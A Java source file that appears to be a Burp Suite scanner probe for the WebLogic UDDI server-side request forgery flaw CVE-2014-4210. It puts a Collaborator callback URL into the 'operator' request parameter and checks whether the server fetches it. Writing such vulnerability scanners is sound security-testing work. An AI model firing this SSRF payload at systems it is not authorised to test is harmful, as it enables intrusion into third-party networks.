package probes;

import burp.*;

import java.util.Base64;
import java.util.concurrent.TimeUnit;

public class CVE_2014_4210 extends Probe {
    private static final String NAME = "CVE-2014-4210";
    private static final String SEVERITY = "Medium";
    private static String detail = "WebLogic UDDI module is exposed!";

    @Override
    public IScanIssue check(IHttpRequestResponse requestResponse) {
        String uddiPath = "/uddiexplorer/SearchPublicRegistries.jsp";

        IHttpRequestResponse checkReqResp = Utilities.makeRequest(requestResponse, uddiPath);

        if (Utilities.getStatus(checkReqResp) == 200) {
            IExtensionHelpers h = Utilities.helpers;
            String pollPayload = Utilities.collaborator.generatePayload(true);
            byte[] req = checkReqResp.getRequest();
            req = h.addParameter(req, h.buildParameter("rdoSearch", "name", IParameter.PARAM_URL));
            req = h.addParameter(req, h.buildParameter("txtSearchname", "sdf", IParameter.PARAM_URL));
            req = h.addParameter(req, h.buildParameter("btnSubmit", "Search", IParameter.PARAM_URL));
            req = h.addParameter(req, h.buildParameter("operator", "http://" + pollPayload + "/55rf", IParameter.PARAM_URL));

            Utilities.callbacks.makeHttpRequest(checkReqResp.getHttpService(), req);
            try {
                TimeUnit.SECONDS.sleep(3);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

            for (IBurpCollaboratorInteraction interaction : Utilities.collaborator.fetchCollaboratorInteractionsFor(pollPayload)) {
                byte[] rawQuery = Base64.getDecoder().decode(interaction.getProperty("request").getBytes());
                if (new String(rawQuery).contains("55rf")) {
                    detail = detail + "<br/><br/>"
                            + "Found SSRF Vulnerability! Receive a http query from " + interaction.getProperty("client_ip")
                            + " at " + interaction.getProperty("time_stamp") + "<br/>"
                            + new String(rawQuery);
                    break;
                }
            }

            return new WebLogicIssue(checkReqResp, NAME, detail, SEVERITY);
        }

        return null;
    }
}
